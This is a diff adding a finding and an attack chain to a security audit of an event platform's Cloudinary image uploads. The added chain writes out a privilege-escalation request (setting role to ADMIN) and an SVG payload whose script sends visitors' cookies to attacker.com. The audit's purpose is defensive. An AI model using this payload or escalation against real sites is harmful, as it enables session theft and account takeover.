@@ -164,7 +164,7 @@ TLS termination in production was either handled by Heroku's built-in SSL (which
 
 **Severity: High**
 
-**Location:** `frontend/.env`, `frontend/dist/`, `frontend/build/`, Cloudinary dashboard
+**Location:** `frontend/.env`, `frontend/dist/`, `frontend/build/`, `frontend/src/components/UploadImage/index.jsx`, Cloudinary dashboard
 
 **Source:** [Managing upload presets in Cloudinary](https://cloudinary.com/documentation/upload_presets)
 
@@ -948,6 +948,69 @@ Additionally, any refresh failure, including server errors caused by the DoS vul
   - Use a frontend logging service (like Sentry) that captures errors server-side without exposing them in the browser.
   - Display a user-friendly error message rather than silently logging out.
 
+---
+
+### Finding 26: Client-side file upload bypasses server validation and misapplies DOMPurify.
+
+**Severity: Critical**
+
+**Location:** `frontend/src/components/UploadImage/index.jsx`
+
+**Sources:**
+- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
+- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
+
+**Description:** Image uploads are sent directly from the browser to Cloudinary without passing through the backend. All validation occurs client-side and is trivially bypasseable.
+
+- **Issue 1: Client-side MIME type validation:**
+  ```js
+  const allowedTypes = ["image/jpeg", "image/png", "image/gif"];
+  if (!allowedTypes.includes(imgElement.type))
+  ```
+
+  `imgElement.type` is derived from the file extension reported by the browser, not the actual file content. Renaming `malicious.php` to `malocious.jpg` bypasses this check entirely. Real MIME type validation requires reading magic bytes server-side.
+
+- **Issue 2: DOMPurify misapplied to binary data:**
+  ```js
+  const sanitized = DOMPurify.sanitize(reader.result);
+  ```
+
+  DOMPurify is an HTML sanitizer applied here to a base64-encoded image data URL. It provides no security value in this context, as base64 image data is not an HTML injection surface. This is a security theater that may additionally corrput image preview data.
+
+- **Issue 3: No server-side upload validation:**
+  Files are uploaded directly to Cloudinary from the browser. The backend has no visibility into what files are being uploaded, by whom or at what rate. THere's no audit trail, no rate limiting per user and no opportunity for server-side validation.
+
+- **Issue 4: Cloudinary credentials exposed in source:**
+
+  ```js
+  data.append("upload_preset", "campoeventos")
+  data.append("cloud_name", CLOUDINARY_ID)
+  fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_ID}/image/upload`)
+  ```
+
+  Both the cloud name and present name are hardcoded in the component source, compiled into the prodution bundle. This is the direct evidence for Finding 8.
+
+**Impact:**
+
+Uploaded images are attached to publicly accessible event pages visible to all site visitors without authentication. This means:
+
+  - A malicious file uploaded by an attacker (who can self-escalate to ADMIN via Finding 21) is inmediately served to every visitor of the platform.
+  - An SVG file contining embedded JS served from the Cloudinary domain could execute in visitors' browsers (Stored XSS with platform-wide reach).
+  - The attack chain requires no victim interaction beyond visiting a public event page:
+
+  ```
+  Register => Escalate to ADMIN (Finding 21) => Upload malicious SVG as event cover => Every visitor executes attacker JavaScript
+  ```
+
+**Recommendation:**
+Route all file uploads through the backend:
+
+```
+Browser => POST /api/upload (multipart) => Backend validates => magic bytes check => size limit => rate limiting => sign upload request => Cloudinary via signed upload
+```
+
+Use Cloudinary's signed upload API: The backend generates a short-lived signature, send it to the frontend, which uses it for a single upload. The API secret never leaves the server.
+
 ## Vulnerability chains:
 
 ### Chain 1: Anonymous user to full application compromise
@@ -993,3 +1056,38 @@ This chain demonstrates how an unauthenticated attacker can achieve complete adm
 - Finding 14 — Broken role-based access control
 - Finding 5 — MongoDB exposed to internet (enables direct DB access once credentials obtained)
 
+### Chain 2: Stored XSS via file upload | Platform-wide impact
+
+**Severity: Critical**
+
+- Step 1: Gain ADMIN access (Findings 2 & 21):
+  ```json
+  POST /register => BASIC account
+  PUT /user/:id/update { "role": "ADMIN" } => ADMIN account
+  ```
+
+- Step 2: Upload malicious SVG as event cover:
+  ```svg
+  POST to Cloudinary with SVG containing:
+  <svg>
+    <script>
+      document.location='https://attacker.com/steal?c='+document.cookie
+    </script>
+  </svg>
+  ```
+
+- Step 3: Attach to public event:
+  Malicious Cloudinary URL stored as event coverImgName.
+  Event is publicly accessible. No authentication required.
+
+Step 4: Every visitor executes attacker JavaScript:
+  ```json
+  GET /remates/:id => event page loads => browser renders SVG => JavaScript executes => session tokens stolen
+  ```
+
+**Findings involved:**
+- Finding 2 — Open registration
+- Finding 21 — Mass assignment privilege escalation  
+- Finding 26 — Client-side only file validation
+- Finding 24 — Auth state in localStorage (tokens stealable via XSS)
+- Finding 8 — Cloudinary unsigned preset (now fixed, but architecture remains vulnerable)
